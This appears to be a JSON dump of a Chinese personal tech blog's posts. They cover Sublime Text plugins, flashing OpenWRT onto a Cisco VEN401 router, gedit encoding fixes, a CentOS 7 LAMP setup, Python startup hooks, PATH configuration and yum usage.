Placeholders故名思意，占位用，包括一些占位文字和 HTML 代码片段，实用。 Sublime Alignment用于代码格式的自动对齐。传说最新版 Sublime 已经集成。 Clipboard History粘贴板历史记录，方便使用复制 / 剪切的内容。 DetectSyntax这是一个代码检测插件。 Nettuts Fetch如果你在用一些公用的或者开源的框架，比如 Normalize.css 或者 modernizr.js，但是，过了一段时间后，可能该开源库已经更新了，而你没有发现，这个时候可能已经不太适合你的项目了，那么你就要重新折腾一遍或者继续用陈旧的文件。Nettuts Fetch 可以让你设置一些需要同步的文件列表，然后保存更新。 JsMinifier该插件基于 Google Closure compiler，自动压缩 js 文件。 Sublime CodeIntel代码自动提示 Bracket Highlighter类似于代码匹配，可以匹配括号，引号等符号内的范围。 Hex to HSL自动转换颜色值，从 16 进制到 HSL 格式，快捷键 Ctrl+Shift+U GBK to UTF8将文件编码从 GBK 转黄成 UTF8，快捷键 Ctrl+Shift+C Git 该插件基本上实现了 git 的所有功能。 总结 好吧，大概就这些，如果你有常用的插件或者扩展，欢迎推荐。Sublime Text 3 真是一款一见钟情的编辑器，每次和别人聊到编辑器时必荐的。。。Sublime Text 3 常用插件以及安装方法 –PHP 第 9 张转载请注明：安全者»Sublime Text 3 常用插件以及安装方法","categories":[{"name":"技术研究","slug":"技术研究","permalink":"https://hexo.bangz.me/categories/技术研究/"}],"tags":[]},{"title":"【手记】Cisco VEN401 刷 OpenWRT 成功","slug":"35","date":"2015-04-12T03:07:00.000Z","updated":"2018-06-08T07:24:49.000Z","comments":true,"path":"archives/flushing-openwrt-to-cisco-ven401.html","link":"","permalink":"https://hexo.bangz.me/archives/flushing-openwrt-to-cisco-ven401.html","excerpt":"参考原文：https://forum.openwrt.org/viewtopic.php?id=54484第一次玩 OpenWRT，弄了个思科的路由器，刷这个玩意失败了好几次，不过最后还是刷成功了随手写个笔记吧，首先 VEN401 这个玩意第一次访问要借助其他带 DHCP 的路由器来用，手头上原本就有个 TP-LINK 的路由器连接到外网，所以用这个正好。给 VEN401 上电源：Reset，然后接上网线进 TP-LINK 的路由器查一下 VEN401 的 IP 地址，然后复制到浏览器登上去VEN401 默认用户名和密码：12Default login user: ATTadmin Default login password: 401!VEN","text":"参考原文：https://forum.openwrt.org/viewtopic.php?id=54484第一次玩 OpenWRT，弄了个思科的路由器，刷这个玩意失败了好几次，不过最后还是刷成功了随手写个笔记吧，首先 VEN401 这个玩意第一次访问要借助其他带 DHCP 的路由器来用，手头上原本就有个 TP-LINK 的路由器连接到外网，所以用这个正好。给 VEN401 上电源：Reset，然后接上网线进 TP-LINK 的路由器查一下 VEN401 的 IP 地址，然后复制到浏览器登上去VEN401 默认用户名和密码：12Default login user: ATTadmin Default login password: 401!VEN 信息来源：https://wikidevi.com/wiki/Cisco_VEN401确认登录能成功之后，进入路由器 web 根目录下的 firmware.asp 例如 http://192.168.1.110/firmware.asp把这个定制并编译好的 brcm47xx 固件上传上去：http://pan.baidu.com/s/1bn3xPfD下载好固件之后，上传固件上传完之后会自动重启，重启完之后就行了PS：如果刷失败了的话，ip 地址可能会直接变成 192.168.1.1（把本地 ARP 表里 TP-LINK 路由器的 MAC 给替换掉了，还好我 TP-LINK 路由器开了远程 web 管理，一下就看出来了，所以可以提前用 arp -a 先把 TP-LINK 的路由器记下来，然后用 arp -s 绑定好 MAC），VEN401 有个好处就是不会成砖，可以放心的刷，我也是刷了好几次才成功的。刷不成功的时候，ping VEN401 返回的 TTL 值是 100，刷成功之后 ping 出来的 TTL 值是 64123C:\\&gt;ping 192.168.1.110 Pinging 192.168.1.110 with 32 bytes of data: Reply from 192.168.1.110: bytes=32 time=9ms TTL=64 因为 openwrt 刷成功之后会自动打开 telnet所以现在就可以直接 telnet 上去了1C:\\&gt;telnet 192.168.1.110 接下来可以按照官方教程来做，用 passwd 设置好密码123456root@openwrt:~$ passwd Changing password for root New password: Retype password: Password for root changed by rootroot@openwrt:~$ 信息来源：http://wiki.openwrt.org/zh-cn/doc/howto/firstloginexit 退出，然后改用 SSH 工具登录（推荐 XShell）123456789101112131415ssh 192.168.1.110 Connecting to 192.168.1.110:22... Connection established. To escape to local shell, press 'Ctrl+Alt+]'. BusyBox v1.22.1 (2014-09-21 02:32:34 CEST) built-in shell (ash) Enter 'help' for a list of built-in commands. ----------------------------------------------------- BARRIER BREAKER (14.07, r42625) ----------------------------------------------------- * 1/2 oz Galliano Pour all ingredients into * 4 oz cold Coffee an irish coffee mug filled * 1 1/2 oz Dark Rum with crushed ice. Stir. * 2 tsp. Creme de Cacao ----------------------------------------------------- root@OpenWrt:~# 这个时候网页其实也可以登录了 以上就是刷 OpenWRT 的整个流程，感觉还是挺流畅的。个人感觉难度不是很大，总之也是凑合着玩玩，哈哈接下来爱怎么折腾怎么折腾吧","categories":[{"name":"项目开发","slug":"项目开发","permalink":"https://hexo.bangz.me/categories/项目开发/"}],"tags":[{"name":"Shell","slug":"Shell","permalink":"https://hexo.bangz.me/tags/Shell/"},{"name":"操作系统","slug":"操作系统","permalink":"https://hexo.bangz.me/tags/操作系统/"},{"name":"OpenWRT","slug":"OpenWRT","permalink":"https://hexo.bangz.me/tags/OpenWRT/"}]},{"title":"【手记】让 linuxmint 17.1 下的 gedit 支持中文编码","slug":"34","date":"2015-04-12T03:01:00.000Z","updated":"2018-06-08T08:14:40.000Z","comments":true,"path":"archives/make-gedit-support-chinese-encoding-on-linuxmint.html","link":"","permalink":"https://hexo.bangz.me/archives/make-gedit-support-chinese-encoding-on-linuxmint.html","excerpt":"看着 linuxmint 不错，就马上装了个来玩，作为一个刚加入 ubuntu 阵营的新手，一路上碰到好多问题。 首先就是这个 gedit 中文编码的问题，之前在 windows 下用 notepad 写了好多 txt 文件，结果发现在 mint 下打开之后中文全是乱码。 查了下，在 17.1 cinnamon 里面默认自带的 gedit 版本是 2.30 1$ gedit --version 1gedit-Version2.30.4 于是在网上找，找了下对应版本的解决办法。总结出大概有三种方法。 一、直接指定编码打开文件","text":"看着 linuxmint 不错，就马上装了个来玩，作为一个刚加入 ubuntu 阵营的新手，一路上碰到好多问题。 首先就是这个 gedit 中文编码的问题，之前在 windows 下用 notepad 写了好多 txt 文件，结果发现在 mint 下打开之后中文全是乱码。 查了下，在 17.1 cinnamon 里面默认自带的 gedit 版本是 2.30 1$ gedit --version 1gedit-Version2.30.4 于是在网上找，找了下对应版本的解决办法。总结出大概有三种方法。 一、直接指定编码打开文件 1$ gedit linux.txt--encoding=gbk 二、在终端直接设置1gconftool-2--set--type=list--list-type=string/apps/gedit-2/preferences/encodings/auto_detected&quot;[GB2312,UTF-8,CURRENT,ISO-8859-15,UTF-16]&quot; 三、使用 GUI 工具 gconf-editor1１、安装 gconf-editor（apt-getinstall gconf-editor）２、运行 gconf-editor３、展开 / apps/gedit-2/preferences/encodings４、在 auto_detected 键中新增 GBK，并使它位于 UTF-8 前面，点 OK。 我在实际操作的时候，发现居然只有第一条有效，第二种第三种都试过了，直接用文件管理器打开居然还是乱码。我就当时就纳闷了，想着都是 ubuntu，应该不会有这种问题的吧。于是 reboot 了一遍。 重启完后再打开 gconf-editor 看了一下，我惊呆了，居然之前设置的东西都没了！ 于是想了想，原来我之前在终端里面启动 gconf 的时候是用 root 启动的，重启完后没进 root，只在普通用户下启动 gconf-editor。想到这里，果断 sudo su - 进 root，再开 gconf-editor，一看，明白了！ 原来是 gedit 中的配置文件还分用户存储，所以之前在 root 用户中配置的东西在普通用户下不起效果！ 这次我再把 auto_detect 中的值增加 GBK 然后放到前位，再用文件管理器调用 gedit 打开 txt 文件，这回正常了。。。 呸，就在这个地方浪费了我半个小时来折腾。。。特此一记！","categories":[{"name":"日常运维","slug":"日常运维","permalink":"https://hexo.bangz.me/categories/日常运维/"}],"tags":[{"name":"Shell","slug":"Shell","permalink":"https://hexo.bangz.me/tags/Shell/"},{"name":"Linux基础","slug":"Linux基础","permalink":"https://hexo.bangz.me/tags/Linux基础/"},{"name":"操作系统","slug":"操作系统","permalink":"https://hexo.bangz.me/tags/操作系统/"}]},{"title":"【手记】CentOS 7 搭建 LAMP 环境","slug":"33","date":"2015-04-12T03:00:00.000Z","updated":"2018-06-08T07:24:49.000Z","comments":true,"path":"archives/centos-7-setup-lamp-server.html","link":"","permalink":"https://hexo.bangz.me/archives/centos-7-setup-lamp-server.html","excerpt":"一、配置防火墙，开启 80 端口、3306 端口CentOS7.0 默认使用的是 firewall 作为防火墙，这里改为 iptables 防火墙。 1、关闭 firewall：12systemctl stop firewalld.service# 停止 firewallsystemctl disable firewalld.service# 禁止 firewall 开机启动 2、安装 iptables 防火墙1yum install iptables-services# 安装","text":"一、配置防火墙，开启 80 端口、3306 端口CentOS7.0 默认使用的是 firewall 作为防火墙，这里改为 iptables 防火墙。 1、关闭 firewall：12systemctl stop firewalld.service# 停止 firewallsystemctl disable firewalld.service# 禁止 firewall 开机启动 2、安装 iptables 防火墙1yum install iptables-services# 安装 123456789101112131415vi/etc/sysconfig/iptables # 编辑防火墙配置文件# Firewall configuration written by system-config-firewall# Manual customization of this file is not recommended.*filter:INPUT ACCEPT[0:0]:FORWARD ACCEPT[0:0]:OUTPUT ACCEPT[0:0] -A INPUT-m state--state ESTABLISHED,RELATED-j ACCEPT-A INPUT-p icmp-j ACCEPT-A INPUT-i lo-j ACCEPT-A INPUT-m state--state NEW-m tcp-p tcp--dport22-j ACCEPT-A INPUT-m state--state NEW-m tcp-p tcp--dport80-j ACCEPT-A INPUT-m state--state NEW-m tcp-p tcp--dport3306-j ACCEPT-A INPUT-j REJECT--reject-withicmp-host-prohibited -A FORWARD-j REJECT--reject-withicmp-host-prohibitedCOMMIT :wq!# 保存退出 12systemctl restart iptables.service# 最后重启防火墙使配置生效systemctl enable iptables.service# 设置防火墙开机启动 参考资料：http://www.cncentos.com/thread-4031-1-1.html 二、安裝 HTTP、PHP、MariaDB 與相關工具12root# yum install httpd mariadb-server mariadb php php-mbstring php-mysql php-gd root# yum install wget unzip 1234root# systemctl start mariadb.service root# systemctl start httpd.service root# systemctl enable mariadb.service root# systemctl enable httpd.service 参考资料：http://technote.aven-network.com/576/centos-7-%E5%BF%AB%E9%80%9F%E8%A8%AD%E5%AE%9A-lamp%EF%BC%88linux-apache-mariadb-php%EF%BC%89 三、配置 MySQL設定 MariaDBInnodb修改 / etc/my.cnf 檔案，在 [mysqld] 下新增1innodb_file_per_table=1 四、测试 PHP建立 info.php 测试文件1vi /var/www/html/info.php 写入以下代码1&lt;?php phpinfo();?&gt; :wq# 保存退出参考资料：https://www.howtoforge.com/apache_php_mysql_on_centos_7_lamp 五、配置 MySQL1root# mysqladmin -u root password 'your-password' 参考资料：http://technote.aven-network.com/576/centos-7-%E5%BF%AB%E9%80%9F%E8%A8%AD%E5%AE%9A-lamp%EF%BC%88linux-apache-mariadb-php%EF%BC%89 【使用 sftp 上传】sftp 连接成功之后常用操作命令如下：123456789101112131415161718192021help/? 打印帮助信息。pwd 查看远程服务器当前目录；lpwd 查看本地系统的当前目录。cd &lt;dir&gt; 将远程服务器的当前目录更改为 & lt;dir&gt;；lcd &lt;dir&gt; 将本地系统的当前目录更改为 & lt;dir&gt;。ls 显示远程服务器上当前目录的文件名；ls -l 显示远程服务器上当前目录的文件详细列表；ls &lt;pattern&gt; 显示远程服务器上符合指定模式 & lt;pattern&gt; 的文件名；ls -l &lt;pattern&gt; 显示远程服务器上符合指定模式 & lt;pattern&gt; 的文件详细列表。lls 显示本地系统上当前目录的文件名；lls 的其他参数与 ls 命令的类似。get &lt;file&gt; 下载指定文件 & lt;file&gt;；get &lt;pattern&gt; 下载符合指定模式 & lt;pattern&gt; 的文件。put &lt;file&gt; 上传指定文件 & lt;file&gt;；get &lt;pattern&gt; 上传符合指定模式 & lt;pattern&gt; 的文件。progress 切换是否显示文件传输进度。mkdir &lt;dir&gt; 在远程服务器上创建目录；lmkdir &lt;dir&gt; 在本地系统上创建目录。exit/quit/bye 退出 sftp。! 启动一个本地 shell。! &lt;commandline&gt; 执行本地命令行。 其他命令还有：chgrp, chmod, chown, ln, lumask, rename, rm, rmdir, symlink, version。","categories":[{"name":"日常运维","slug":"日常运维","permalink":"https://hexo.bangz.me/categories/日常运维/"}],"tags":[{"name":"Linux基础","slug":"Linux基础","permalink":"https://hexo.bangz.me/tags/Linux基础/"},{"name":"MySQL","slug":"MySQL","permalink":"https://hexo.bangz.me/tags/MySQL/"},{"name":"PHP","slug":"PHP","permalink":"https://hexo.bangz.me/tags/PHP/"},{"name":"云计算","slug":"云计算","permalink":"https://hexo.bangz.me/tags/云计算/"},{"name":"Apache","slug":"Apache","permalink":"https://hexo.bangz.me/tags/Apache/"},{"name":"LAMP","slug":"LAMP","permalink":"https://hexo.bangz.me/tags/LAMP/"}]},{"title":"Windows 下的整数分区计算","slug":"32","date":"2015-04-12T02:59:00.000Z","updated":"2018-06-08T08:08:24.000Z","comments":true,"path":"archives/calculate-disk-capacity-on-windows.html","link":"","permalink":"https://hexo.bangz.me/archives/calculate-disk-capacity-on-windows.html","excerpt":"先放一个简单的在线计算工具： http://www.iplaysoft.com/tools/partition-calculator/ 关于分区，硬盘厂商设计的是 1GB＝1000Mb，而操作系统却认为 1Gb＝1024Mb，而这个整数分区的公式既不是按照硬盘厂商的设计也不是操作系统的设计，而是另有误差。原因就是硬盘在分区和格式化之后还会在硬盘上占用一定的空间用来存储磁盘结构和数据位置等信息。","text":"先放一个简单的在线计算工具： http://www.iplaysoft.com/tools/partition-calculator/ 关于分区，硬盘厂商设计的是 1GB＝1000Mb，而操作系统却认为 1Gb＝1024Mb，而这个整数分区的公式既不是按照硬盘厂商的设计也不是操作系统的设计，而是另有误差。原因就是硬盘在分区和格式化之后还会在硬盘上占用一定的空间用来存储磁盘结构和数据位置等信息。 对于 FAT32 格式： 应分配 MB 数 =(分区 GB 数－1)×4+1024× 分区 GB 数 也就是说，如果你要在 FAT32 格式的硬盘上分出一个 10 GB 的硬盘，那么： 你应该分配的 MB 数 =(10-1)×4+1024×10=10276 MB 这样你就可以得到整数的 10 GB 分区了。 对于 NTFS 格式： 硬盘一般有 255 磁头，63 扇区，故每柱面大小为： 512byte x 255 x 63＝8225280bytes ＝7.84423828125 MB 如果要分 10 GB, 那么要 10x1024 MB=10240 MB 需要柱面数为 10240÷7.84423828125=1305.416744475568004979769685652 取整数既为 1306 个柱面 应分 MB 数为 1306x7.84423828125=10244.5751953125 MB 不管小数点后面几位都进 1，也就是 10245 MB，系统也就认为是 10.00 GB 了。 另附一张证书分区表","categories":[{"name":"实用工具","slug":"实用工具","permalink":"https://hexo.bangz.me/categories/实用工具/"}],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"https://hexo.bangz.me/tags/操作系统/"}]},{"title":"python 学习笔记：python 解释器所使用的两个 hook","slug":"30","date":"2015-04-09T19:06:00.000Z","updated":"2018-06-08T08:06:14.000Z","comments":true,"path":"archives/hooks-in-python-interpreter.html","link":"","permalink":"https://hexo.bangz.me/archives/hooks-in-python-interpreter.html","excerpt":"先引用下原文：2.2.5. 本地化模块 Python 提供了两个钩子 (方法) 来本地化: sitecustomize 和 usercustomize。为了见识它们，你首先需要找到你的 site-packages 的目录。启动 python 执行下面的代码: 123&gt;&gt;&gt;import site &gt;&gt;&gt;site.getusersitepackages() '/home/user/.local/lib/python2.7/site-packages' 现在你可以在 site-packages 的目录下创建 usercustomize.py 文件，内容就悉听尊便了。这个文件将会影响 python 的每次调用，除非启动的时候加入 -s 选项禁止自动导入。* sitecustomize 的工作方式一样，但是是由电脑的管理账户创建以及在 usercustomize 之前导入。具体可以参见 site 。","text":"先引用下原文：2.2.5. 本地化模块 Python 提供了两个钩子 (方法) 来本地化: sitecustomize 和 usercustomize。为了见识它们，你首先需要找到你的 site-packages 的目录。启动 python 执行下面的代码: 123&gt;&gt;&gt;import site &gt;&gt;&gt;site.getusersitepackages() '/home/user/.local/lib/python2.7/site-packages' 现在你可以在 site-packages 的目录下创建 usercustomize.py 文件，内容就悉听尊便了。这个文件将会影响 python 的每次调用，除非启动的时候加入 -s 选项禁止自动导入。* sitecustomize 的工作方式一样，但是是由电脑的管理账户创建以及在 usercustomize 之前导入。具体可以参见 site 。 这里涉及到两个 hook 文件 一个是 sitecustomize.py，这个是全局定义的 hook，对所有用户都适用的 hook 方案 他的位置一般在 python 的安装目录下，如 / etc/python2.7/ 另一个是 usercustomize.py，这个是用户自己定义的 hook，只对当前用户生效 他的位置被放在了用户目录下，如 / home/monolight/.local/lib/python2.7/site-packages/ 使用实例：python 的 sitecustomize.py 妙用 在 zope 实例所采用的 python 的路径中，找到 site-packages 目录，在此目录中建立一个 sitecustomize.py 文件，设置相应的权限。文件的内容如下： 12import syssys.setdefaultencoding(\"utf-8\") 重启 zope 实例，这样将解决很多 unicodedecodeerror 错误。 1234#for python2.7 on ubuntu/etc/python2.7/sitecustomize.py#for python2.6 on centOS/usr/local/lib/python2.6/site-packages/sitecustomize.py 12345678http://www.grabner-online.de/div_into/html/ch09s04s03.html# sitecustomize.py # this file can be anywhere in your Python path,# but it usually goes in $&#123;pythondir&#125;/lib/site-packages/import syssys.setdefaultencoding('iso-8859-1') sitecustomize.py is a special script; Python will try to import it on startup, so any code in it will be run automatically. As the comment mentions, it can go anywhere (as long as import can find it), but it usually goes in the site-packages directory within your Python lib directory. setdefaultencoding function sets, well, the default encoding. This is the encoding scheme that Python will try to use whenever it needs to auto-coerce a unicode string into a regular string.","categories":[{"name":"技术研究","slug":"技术研究","permalink":"https://hexo.bangz.me/categories/技术研究/"}],"tags":[{"name":"PYTHON","slug":"PYTHON","permalink":"https://hexo.bangz.me/tags/PYTHON/"},{"name":"Shell","slug":"Shell","permalink":"https://hexo.bangz.me/tags/Shell/"}]},{"title":"在 Linux 里设置环境变量的方法（export PATH）","slug":"29","date":"2015-04-09T18:37:00.000Z","updated":"2018-06-08T08:02:56.000Z","comments":true,"path":"archives/configure-enviroment-varible-on-linux.html","link":"","permalink":"https://hexo.bangz.me/archives/configure-enviroment-varible-on-linux.html","excerpt":"在 Linux 里设置环境变量的方法（export PATH） 一般来说，配置交叉编译工具链的时候需要指定编译工具的路径，此时就需要设置环境变量。例如我的 mips-linux-gcc 编译器在 /opt/au1200_rm/build_tools/bin 目录下，build_tools 就是我的编译工具，则有如下三种方法来设置环境变量： 1、直接用 export 命令：1export PATH=$PATH:/opt/au1200_rm/build_tools/bin 查看是否已经设好，可用命令 export 查看：","text":"在 Linux 里设置环境变量的方法（export PATH） 一般来说，配置交叉编译工具链的时候需要指定编译工具的路径，此时就需要设置环境变量。例如我的 mips-linux-gcc 编译器在 /opt/au1200_rm/build_tools/bin 目录下，build_tools 就是我的编译工具，则有如下三种方法来设置环境变量： 1、直接用 export 命令：1export PATH=$PATH:/opt/au1200_rm/build_tools/bin 查看是否已经设好，可用命令 export 查看：1234567891011121314151617181920212223242526[root@localhost bin]# exportdeclare -x BASH_ENV=\"/root/.bashrc\"declare -x G_BROKEN_FILENAMES=\"1\"declare -x HISTSIZE=\"1000\"declare -x HOME=\"/root\"declare -x HOSTNAME=\"localhost.localdomain\"declare -x INPUTRC=\"/etc/inputrc\"declare -x LANG=\"zh_CN.GB18030\"declare -x LANGUAGE=\"zh_CN.GB18030:zh_CN.GB2312:zh_CN\"declare -x LESSOPEN=\"|/usr/bin/lesspipe.sh %s\"declare -x LOGNAME=\"root\"declare -x LS_COLORS=\"no=00:fi=00:di=01;34:ln=01;36:pi=40;33:so=01;35:bd=40;33;01:cd=40;33;01:or=01;05;37;41:mi=01;05;37;41:ex=01;32:*.cmd=01;32:*.exe=01;32:*.com=01;32:*.btm=01;32:*.bat=01;32:*.sh=01;32:*.csh=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.gz=01;31:*.bz2=01;31:*.bz=01;31:*.tz=01;31:*.rpm=01;31:*.cpio=01;31:*.jpg=01;35:*.gif=01;35:*.bmp=01;35:*.xbm=01;35:*.xpm=01;35:*.png=01;35:*.tif=01;35:\"declare -x MAIL=\"/var/spool/mail/root\"declare -x OLDPWD=\"/opt/au1200_rm/build_tools\"declare -x PATH=\"/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/usr/X11R6/bin:/root/bin:/opt/au1200_rm/build_tools/bin\"declare -x PWD=\"/opt/au1200_rm/build_tools/bin\"declare -x SHELL=\"/bin/bash\"declare -x SHLVL=\"1\"declare -x SSH_ASKPASS=\"/usr/libexec/openssh/gnome-ssh-askpass\"declare -x SSH_AUTH_SOCK=\"/tmp/ssh-XX3LKWhz/agent.4242\"declare -x SSH_CLIENT=\"10.3.37.152 2236 22\"declare -x SSH_CONNECTION=\"10.3.37.152 2236 10.3.37.186 22\"declare -x SSH_TTY=\"/dev/pts/2\"declare -x TERM=\"linux\"declare -x USER=\"root\"declare -x USERNAME=\"root\" 可以看到，环境变量已经设好，PATH 里面已经有了我要加的编译器的路径。 2、修改 profile 文件：1vi /etc/profile 在里面加入:1export PATH=\"$PATH:/opt/au1200_rm/build_tools/bin\" 3. 修改. bashrc 文件：1vi ~/.bashrc 在里面加入：1export PATH=\"$PATH:/opt/au1200_rm/build_tools/bin\" 后两种方法一般需要重新启动 shell 才能生效，不过也可以手动让它直接生效1source ~/.bashrc 最后可以通过 echo 命令测试一下：1echo $PATH 看看输出里面是不是已经有了这个新的路径了。","categories":[{"name":"日常运维","slug":"日常运维","permalink":"https://hexo.bangz.me/categories/日常运维/"}],"tags":[{"name":"Shell","slug":"Shell","permalink":"https://hexo.bangz.me/tags/Shell/"},{"name":"Linux基础","slug":"Linux基础","permalink":"https://hexo.bangz.me/tags/Linux基础/"},{"name":"操作系统","slug":"操作系统","permalink":"https://hexo.bangz.me/tags/操作系统/"}]},{"title":"python 学习笔记：配置 PYTHONSTARTUP","slug":"28","date":"2015-04-09T08:45:00.000Z","updated":"2018-06-08T07:52:56.000Z","comments":true,"path":"archives/configure-python-startup.html","link":"","permalink":"https://hexo.bangz.me/archives/configure-python-startup.html","excerpt":"今天刚入门 python，，为了快速学习，找了几个官方文档的中文翻译来看，感觉还不错 http://www.pythondoc.com/pythontutorial27/ 我的 python 版本是 2.7.6，文档中的版本是 2.7.8，靠，帮助文档都比我机子上的版本新。 可是学校坑爹的断网机制啊，看来今晚没戏了，将就着玩玩先吧。 今天的几个实验很成功，第一个就是学习 python 交互模式的使用，在 linux 下，命令行里直接输入 python2 或者 python 就能直接进入 python 的交互模式了 在这里的提示符有两种状态 第一个是主提示符状态 &gt;&gt;&gt; 第二个是从提示符状态 …","text":"今天刚入门 python，，为了快速学习，找了几个官方文档的中文翻译来看，感觉还不错 http://www.pythondoc.com/pythontutorial27/ 我的 python 版本是 2.7.6，文档中的版本是 2.7.8，靠，帮助文档都比我机子上的版本新。 可是学校坑爹的断网机制啊，看来今晚没戏了，将就着玩玩先吧。 今天的几个实验很成功，第一个就是学习 python 交互模式的使用，在 linux 下，命令行里直接输入 python2 或者 python 就能直接进入 python 的交互模式了 在这里的提示符有两种状态 第一个是主提示符状态 &gt;&gt;&gt; 第二个是从提示符状态 … 用一个 if 语句的例子就能很清楚的阐述其的区别了12345&gt;&gt;&gt; the_world_is_flat=1&gt;&gt;&gt; if the_world_is_flat:... print \"Be careful not to fall off!\"...Be careful not to fall off! 从属关系的定义简单清晰明了，遇到类似流程控制语句 if while for 等时就会进入从提示符的状态 第二个小实验就是配置 python 解释器启动时要执行的文件 这个要用到 PYTHONSTARTUP 环境变量，直接1export PYTHONSTARTUP='/windows/D/Visual Studio 2012/python/startup' 然后在这个目录下 touch 个 startup 文件 顺手再 touch 个 pythonrc touch startup touch .pythonrc.py 分别编辑他们1vi startup 12import osif os.path.isfile('.pythonrc.py'): execfile('.pythonrc.py') 1vi .pythonrc.py 1print \"hello monolight!\" 编辑玩之后直接就生效了，运行 python1python 12345Python 2.7.6 (default, Mar 22 2014, 22:59:56) [GCC 4.8.2] on linux2 Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.hello monolight!&gt;&gt;&gt; 第三个实验是建立在第二个实验的基础上的，简单写一个 python 程序，通过调用环境变量来使用 startup 文件1vi readenv.py 1234import osfilename = os.environ.get('PYTHONSTARTUP')if filename and os.path.isfile(filename):execfile(filename) 12python readenv.py hello monolight!","categories":[{"name":"技术研究","slug":"技术研究","permalink":"https://hexo.bangz.me/categories/技术研究/"}],"tags":[{"name":"PYTHON","slug":"PYTHON","permalink":"https://hexo.bangz.me/tags/PYTHON/"},{"name":"Shell","slug":"Shell","permalink":"https://hexo.bangz.me/tags/Shell/"}]},{"title":"yum 工具的使用","slug":"27","date":"2015-03-31T00:01:00.000Z","updated":"2018-06-08T07:48:26.000Z","comments":true,"path":"archives/tutorial-of-centos-yum.html","link":"","permalink":"https://hexo.bangz.me/archives/tutorial-of-centos-yum.html","excerpt":"在说这个之前，我要先说下我对 yum 工具的认识，在我的认识中，yum 工具其实只是一个软件管理器，相当与 Windows 下的各种软件管家或者 Android 下的应用商店一样的东西而已，不过这个工具却不仅仅只是安装卸载应用软件这么简单，他还提供维持 linux 系统稳定的必须系统软件，包括内核也在它的管理范围之内。所以在 linux 下，这样的软件管理工具已经成为各发行版必备的东西。在 debian 阵营中他的名字叫 dpkg，在 ubuntu 中它的名字叫 apt，在 OpenSUSE 中，他的名字叫 zypper，在 Red Hat 中，它的名字叫 rpm，在 CentOS 中，它的名字就叫做 yum。 由于 CentOS 是属于 RedHat 阵营的，俗称盗版 Red Hat Enterprise（误），所以它具有 Red Hat 阵营的基本特性，也就是包括 rpm 在内的系统架构方式。因此会 CentOS 的同学，用其他 Red Hat 阵营的 linux 发行版都很容易适应。 其实 CentOS 6 到 CentOS 7 这两个版本之间产生了很多的变化，比如原来的 iptables 已不再使用，主打防火墙是 firewalld，在实际使用中还会体验到更多的明显变化。所以我们在学习 yum 之前，应该要先了解 CentOS。 查看 linux 内核的办法12# uname -aLinux myServer 3.10.0-123.13.1.el7.x86_64 #1 SMP Tue Dec 9 23:06:09 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux","text":"在说这个之前，我要先说下我对 yum 工具的认识，在我的认识中，yum 工具其实只是一个软件管理器，相当与 Windows 下的各种软件管家或者 Android 下的应用商店一样的东西而已，不过这个工具却不仅仅只是安装卸载应用软件这么简单，他还提供维持 linux 系统稳定的必须系统软件，包括内核也在它的管理范围之内。所以在 linux 下，这样的软件管理工具已经成为各发行版必备的东西。在 debian 阵营中他的名字叫 dpkg，在 ubuntu 中它的名字叫 apt，在 OpenSUSE 中，他的名字叫 zypper，在 Red Hat 中，它的名字叫 rpm，在 CentOS 中，它的名字就叫做 yum。 由于 CentOS 是属于 RedHat 阵营的，俗称盗版 Red Hat Enterprise（误），所以它具有 Red Hat 阵营的基本特性，也就是包括 rpm 在内的系统架构方式。因此会 CentOS 的同学，用其他 Red Hat 阵营的 linux 发行版都很容易适应。 其实 CentOS 6 到 CentOS 7 这两个版本之间产生了很多的变化，比如原来的 iptables 已不再使用，主打防火墙是 firewalld，在实际使用中还会体验到更多的明显变化。所以我们在学习 yum 之前，应该要先了解 CentOS。 查看 linux 内核的办法12# uname -aLinux myServer 3.10.0-123.13.1.el7.x86_64 #1 SMP Tue Dec 9 23:06:09 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux 这里边的 el7 其实就已经说明了现在使用的 rhel7 的内核了，也就是 CentOS 7，x86_64 说明是 64 位架构的系统。 如果不确定，其实还有更准确的办法。直接查看 release 文档12# cat /etc/redhat-release CentOS Linux release 7.0.1406 (Core) 或者 cat 别的都可以，不过他们本质上都是 centos-release 的映射12345# ls -al /etc/*-release -rw-r--r--. 1 root root 38 Feb 20 14:38 /etc/centos-release -rw-r--r--. 1 root root 254 Feb 20 14:38 /etc/os-release lrwxrwxrwx. 1 root root 14 Mar 2 05:41 /etc/redhat-release -&amp;gt; centos-release lrwxrwxrwx. 1 root root 14 Mar 2 05:41 /etc/system-release -&amp;gt; centos-release 了解了系统的 CentOS 的版本之后，我们才保证正确的使用 yum 工具。在不知道 yum 工具怎么用的情况下，我们先看下 yum 工具的自带帮助123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990# yum --helpLoaded plugins: fastestmirrorUsage: yum [options] COMMANDList of Commands:check Check for problems in the rpmdbcheck-update Check for available package updatesclean Remove cached datadeplist List a package's dependenciesdistribution-synchronization Synchronize installed packages to the latest available versionsdowngrade downgrade a packageerase Remove a package or packages from your systemfs Creates filesystem snapshots, or lists/deletes current snapshots.fssnapshot Creates filesystem snapshots, or lists/deletes current snapshots.groups Display, or use, the groups informationhelp Display a helpful usage messagehistory Display, or use, the transaction historyinfo Display details about a package or group of packagesinstall Install a package or packages on your systemlist List a package or groups of packagesload-transaction load a saved transaction from filenamemakecache Generate the metadata cacheprovides Find what package provides the given valuereinstall reinstall a packagerepo-pkgs Treat a repo. as a group of packages, so we can install/remove all of themrepolist Display the configured software repositoriessearch Search package details for the given stringshell Run an interactive yum shellswap Simple way to swap packages, instead of using shellupdate Update a package or packages on your systemupdate-minimal Works like upgrade, but goes to the'newest'package match which fixes a problem that affects your systemupdateinfo Acts on repository update informationupgrade Update packages taking obsoletes into accountversion Display a version for the machine and/or available repos.Options: -h, --help show this help message and exit -t, --tolerant be tolerant of errors -C, --cacheonly run entirely from system cache, don't update cache -c [config file], --config=[config file] config file location -R [minutes], --randomwait=[minutes] maximum command wait time -d [debug level], --debuglevel=[debug level] debugging output level --showduplicates show duplicates, in repos, in list/search commands -e [error level], --errorlevel=[error level] error output level --rpmverbosity=[debug level name] debugging output level for rpm -q, --quiet quiet operation -v, --verbose verbose operation -y, 